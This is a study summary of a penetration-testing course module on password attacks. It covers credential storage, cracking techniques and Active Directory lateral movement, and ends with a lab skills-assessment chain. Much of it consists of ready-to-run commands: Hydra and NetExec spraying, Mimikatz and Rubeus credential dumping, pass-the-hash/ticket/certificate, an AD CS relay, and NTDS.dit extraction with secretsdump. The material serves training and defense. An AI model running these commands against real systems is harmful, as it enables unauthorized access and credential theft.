# Password Attacks – Complete Module Summary

## 1. Core Security Principles

- **Confidentiality** – keep data secret
- **Integrity** – ensure data is not tampered with
- **Availability** – ensure data is accessible when needed

**Authentication** = proving identity.

Authentication factors include:

1. Something you know
2. Something you have
3. Something you are
4. Somewhere you are

**Authorization** = what you're allowed to do after authentication.

---

## 2. Password Storage

### Windows

| Location | Purpose |
|---|---|
| `SAM` | Stores local user hashes (LM/NTLM). Protected by SYSKEY and requires SYSTEM privileges to access. |
| `NTDS.dit` | Domain database on Domain Controllers containing domain user hashes. |
| `LSASS` | Caches credentials in memory, including hashes and plaintext credentials when WDigest is enabled. |
| `Credential Manager` | Stores saved credentials for network resources, websites, etc., protected with DPAPI. |

### Linux

| Location | Purpose |
|---|---|
| `/etc/passwd` | User information. Generally world-readable; password field normally contains `x`. |
| `/etc/shadow` | Password hashes and password-expiration information. Root-readable. |
| `/etc/security/opasswd` | Stores old passwords to prevent password reuse. |
| `/tmp` ccache files | Temporary Kerberos tickets. |
| `keytab` files | Permanent Kerberos keys used for automated authentication. |

### Hashing Algorithms

- **LM** – weak and obsolete.
- **NTLM** – Windows password-hashing mechanism.
- **SHA-512** – Linux crypt format `$6$`
- **SHA-256** – Linux crypt format `$5$`
- **MD5** – Linux crypt format `$1$`
- **yescrypt** – Linux crypt format `$y$`
- **DCC2** – cached domain credentials; intentionally slow to crack.

---

## 3. Password Cracking Techniques

| Attack | Description |
|---|---|
| **Dictionary** | Attempts passwords from a wordlist such as `rockyou.txt`. |
| **Brute-force** | Attempts every possible combination. Slow but exhaustive. |
| **Rainbow tables** | Uses pre-computed hash-to-password lookups. Salting significantly reduces their usefulness. |
| **Rule-based** | Applies mutations to dictionary words, such as numbers, capitalization, and leetspeak. |
| **Mask attack** | Brute-forces using a known password pattern, e.g. `?u?l?l?d?d?s`. |
| **Password spraying** | Attempts one password against many usernames to reduce account-lockout risk. |
| **Credential stuffing** | Uses previously leaked username/password combinations against another service. |

### Salting

- A **salt** is random data added to a password before hashing.
- Salting prevents identical passwords from producing identical hashes.
- Salts make pre-computed rainbow-table attacks impractical.
- The salt is normally stored alongside the password hash.

---

## 4. Tools Overview

| Tool | Purpose |
|---|---|
| **John the Ripper** | Password-hash cracking using single-crack, wordlist, incremental, and other modes. |
| **Hashcat** | GPU-accelerated password-hash cracking supporting many hash types. |
| **Hydra** | Online password attacks against services such as SSH, RDP, SMB, and FTP. |
| **NetExec (`nxc`)** | Windows/AD enumeration, password spraying, share enumeration, and credential operations. |
| **Evil-WinRM** | PowerShell Remoting client for WinRM. |
| **Mimikatz** | Windows credential extraction and Kerberos/NTLM operations. |
| **Rubeus** | Kerberos ticket operations including TGT requests, ticket dumping, and pass-the-ticket. |
| **Impacket** | Python toolkit containing tools such as `secretsdump`, `psexec`, `wmiexec`, and `atexec`. |
| **pypykatz** | Python implementation of Mimikatz functionality that can run from Linux. |
| **LaZagne** | Credential extraction from browsers, email clients, and other applications. |
| **PCredz** | Credential extraction from packet captures. |
| **Snaffler / PowerHuntShares** | Credential discovery across network shares. |
| **PKINITtools** | Obtaining Kerberos tickets using certificates. |
| **pywhisker** | Shadow Credentials operations involving `msDS-KeyCredentialLink`. |

---

## 5. Attacking Network Services

| Service | Port | Cracking Tool | Connect Tool |
|---|---:|---|---|
| **WinRM** | 5985/5986 | `netexec winrm` | `evil-winrm` |
| **SSH** | 22 | `hydra` | `ssh` |
| **RDP** | 3389 | `hydra` | `xfreerdp` |
| **SMB** | 445 | `netexec smb`, `hydra`, `msf` | `smbclient`, `netexec` |

### Example Commands

```bash
# WinRM password attack
netexec winrm 10.10.10.10 -u users.txt -p passwords.txt

# SSH password attack
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

# RDP password attack
hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -t 4

# SMB share enumeration
netexec smb 10.10.10.10 -u user -p pass --shares

# Access SMB share
smbclient -U user //10.10.10.10/share

6. Credential Hunting
Windows

Search for credentials in:

.txt
.xml
.config
.ps1
.xlsx
Configuration files
Registry entries
Saved application sessions
Credential Manager
Browser credential stores
LSASS memory
Network shares

Useful command:

cmdkey /list

Useful tools include:

LaZagne
Firefox Decrypt
pypykatz
Snaffler
PowerHuntShares
NetExec --spider
Linux

Look for credentials in:

.conf
.cnf
.config
.sh
.py
.pl
.bash_history
.zsh_history
/etc/crontab
/etc/cron.d/
/var/log/auth.log
/var/log/syslog
Keyrings
Kerberos ccache
Kerberos keytab files
Network Traffic / PCAP

Use Wireshark filters such as:

http
ftp
snmp
smtp

PCredz can also be used to identify credentials in packet captures.

7. Pass-the-Hash (PtH)

Pass-the-Hash allows authentication using an NTLM hash instead of recovering the plaintext password.

Windows – Mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTLM_HASH> /domain:inlanefreight.htb /run:cmd.exe" exit
Windows – Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec `
    -Target DC01 `
    -Username julio `
    -Hash <NTLM_HASH> `
    -Command "whoami"
Linux – Impacket
impacket-psexec administrator@10.10.10.10 -hashes :<NTLM_HASH>
Linux – NetExec
netexec smb 10.10.10.10 \
    -u Administrator \
    -H <NTLM_HASH> \
    -x whoami
Linux – Evil-WinRM
evil-winrm -i 10.10.10.10 -u Administrator -H <NTLM_HASH>
RDP

RDP pass-the-hash may require Restricted Admin mode to be enabled.

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:10.10.10.10 /u:Administrator /pth:<NTLM_HASH>
8. Pass-the-Ticket (PtT)

Pass-the-Ticket involves using Kerberos tickets to authenticate as another identity.

Windows – Harvest Tickets

Using Mimikatz:

mimikatz.exe privilege::debug sekurlsa::tickets /export

Using Rubeus:

Rubeus.exe dump /nowrap
Windows – OverPass-the-Hash

Request a TGT using an NTLM hash:

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<NTLM_HASH> /ptt
Windows – Import Ticket

Using Rubeus:

Rubeus.exe ptt /ticket:<path_to_kirbi>

Using Mimikatz:

mimikatz.exe kerberos::ptt "C:\path\ticket.kirbi"
Linux – Find Keytabs
find / -name '*keytab*' -ls 2>/dev/null
Linux – Authenticate Using Keytab
kinit user@REALM -k -t /path/to/keytab
klist
smbclient //dc01/share -k -c ls
Linux – Use a ccache File
export KRB5CCNAME=/tmp/krb5cc_*
klist
smbclient //dc01/share -k -c ls
Convert Between ccache and kirbi
impacket-ticketConverter krb5cc_ file.kirbi
Linikatz
./linikatz.sh
9. Pass-the-Certificate (PtC)
ESC8 – AD CS Relay Attack

A high-level attack chain:

Configure ntlmrelayx to relay NTLM authentication to AD CS web enrollment.
Trigger authentication from the target.
Obtain a certificate for the target machine account.
Use PKINITtools to obtain a Kerberos TGT.
Use the resulting Kerberos access for further authorized AD operations.

Example lab command:

impacket-ntlmrelayx \
    -t http://<CA_IP>/certsrv/certfnsh.asp \
    --adcs \
    -smb2support \
    --template KerberosAuthentication

Trigger authentication:

python3 printerbug.py DOMAIN/user:pass@DC_IP <Attacker_IP>

Obtain a TGT:

python3 gettgtpkinit.py \
    -cert-pfx DC01$.pfx \
    -dc-ip <DC_IP> \
    'DOMAIN/dc01$' \
    dc.ccache

Use the ticket:

export KRB5CCNAME=dc.ccache

impacket-secretsdump \
    -k \
    -no-pass \
    -dc-ip <DC_IP> \
    -just-dc-user Administrator \
    'DOMAIN/DC01$'@DC01
Shadow Credentials

Shadow Credentials abuse the msDS-KeyCredentialLink attribute when the attacker has the necessary write permissions.

Add a shadow credential:

pywhisker \
    --dc-ip <DC_IP> \
    -d DOMAIN \
    -u wwhite \
    -p 'pass' \
    --target jpinkman \
    --action add

Obtain a TGT:

python3 gettgtpkinit.py \
    -cert-pfx file.pfx \
    -pfx-pass 'password' \
    -dc-ip <DC_IP> \
    DOMAIN/jpinkman \
    jpinkman.ccache

Use the resulting ticket:

export KRB5CCNAME=jpinkman.ccache

evil-winrm -i dc01 -r DOMAIN
10. Linux Authentication & Credential Hunting
PAM and Password Files
/etc/passwd   → user database
/etc/shadow   → password hashes

/etc/passwd is generally readable by normal users, while /etc/shadow is normally restricted to root.

unshadow combines the two files into a format suitable for password cracking.

Cracking Linux Hashes
unshadow passwd shadow > hashes.txt

john --single hashes.txt

john --wordlist=rockyou.txt hashes.txt

hashcat -m 1800 -a 0 hashes.txt rockyou.txt
Hunting for Credentials

Search configuration files:

find / -name "*.conf" -exec grep -l "password" {} \;

Check shell and application history:

.bash_history
.mysql_history
.python_history

Also inspect:

Cronjobs
Scripts
Configuration files
Keyrings
Application credentials
Kerberos tickets

Tools:

laZagne
mimipenguin
11. Password Policies & Managers
Key Policy Guidelines
Minimum password length of at least 8 characters; longer is preferable.
Use a mixture of character types where appropriate.
Avoid common words.
Avoid company names, months, seasons, and predictable patterns.
Avoid unnecessary mandatory password expiration.
Implement MFA.
Use password managers.
Password Managers
Cloud
1Password
Bitwarden
Dashlane
LastPass
Local
KeePass
KWalletManager
Password Safe

A password manager stores passwords inside an encrypted vault, allowing the user to remember only the master password.

Zero-knowledge architecture aims to prevent the provider from being able to access the user's stored secrets.

Passwordless Future

Modern authentication increasingly uses:

FIDO2
WebAuthn
Security keys
Biometrics
TOTP
Push-based MFA
12. Skills Assessment Scenario
Environment
DMZ01
 └── External SSH access

Internal Network
 └── 172.16.119.0/24
      ├── JUMP01
      ├── FILE01
      └── DC01
Goal

Obtain:

NEXURA\Administrator

NTLM hash.

Attack Chain
External Access
      ↓
Username Enumeration
      ↓
Password Spray
      ↓
DMZ01 Foothold
      ↓
SSH Tunnel / Pivot
      ↓
Internal Network
      ↓
Credential Discovery
      ↓
RDP to JUMP01
      ↓
Password Safe Discovery
      ↓
Crack Password Safe
      ↓
Local Administrator Access
      ↓
Credential Extraction
      ↓
Domain Administrator Access
      ↓
DC01
      ↓
NTDS.dit
      ↓
Administrator NTLM Hash
Step-by-Step

Initial foothold

Password spray SSH after enumerating valid usernames.

Pivot

Use an SSH tunnel or Ligolo-ng to access the internal network.

Lateral movement

Search shell history and other credential sources for additional credentials.

Password Safe

Locate a .psafe3 vault on a share.

Crack the vault

Use pwsafe2john and John the Ripper.

RDP as a local administrator

Use the recovered credentials on JUMP01.

Credential extraction

Extract credentials from the system.

Domain Administrator

Use the recovered Domain Administrator credentials to access DC01.

Dump NTDS

Obtain NTDS.dit and the SYSTEM hive.

Extract hashes

Use secretsdump to recover the domain hashes.

Example Commands
SSH Tunnel
ssh \
    -L 3389:172.16.119.7:3389 \
    -L 4445:172.16.119.11:445 \
    jbetty@10.129.169.206
Crack Password Safe
pwsafe2john Employee-Passwords_OLD.psafe3 > pwhash.txt

john \
    --format=pwsafe \
    --wordlist=rockyou.txt \
    pwhash.txt
Credential Extraction on JUMP01
mimikatz.exe privilege::debug sekurlsa::logonpasswords
Create NTDS Shadow Copy
vssadmin create shadow /for=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit

reg save hklm\system C:\SYSTEM
Extract Hashes
impacket-secretsdump \
    -ntds NTDS.dit \
    -system SYSTEM \
    LOCAL
13. Summary of Key Concepts
Password Cracking

Password cracking is about guessing efficiently.

Primary approaches include:

Wordlists
Rules
Masks
Brute force
Credential Hunting

Credentials can appear in:

Files
Memory
Configuration
Logs
Network traffic
Shares
Browser storage
Application databases
Kerberos tickets
Lateral Movement

Common authentication-based techniques include:

Pass-the-Hash
Pass-the-Ticket
Pass-the-Certificate
Pivoting

Pivoting allows access to otherwise unreachable network segments.

Common techniques include:

SSH tunnels
Ligolo-ng
Proxychains
Defense

The defensive objective is to break the attack chain as early as possible.

Key controls include:

Limit administrative privileges.
Implement MFA.
Protect credential stores.
Monitor authentication anomalies.
Secure network segmentation.
Prevent credential reuse.
Protect privileged accounts.
Monitor credential access and lateral movement.
Core Mental Model

The most important lesson is to understand the attack chain, rather than memorizing individual commands.

ENUMERATE
    ↓
IDENTIFY CREDENTIAL MATERIAL
    ↓
VALIDATE ACCESS
    ↓
GAIN FOOTHOLD
    ↓
ENUMERATE AGAIN
    ↓
FIND BETTER CREDENTIALS / PRIVILEGES
    ↓
LATERAL MOVEMENT
    ↓
PRIVILEGE ESCALATION
    ↓
SYSTEM / DOMAIN OBJECTIVE

Remember: The attacker's objective is to move from limited access toward higher privileges and ultimately the required target objective. The defender's objective is to break that chain as early as possible.
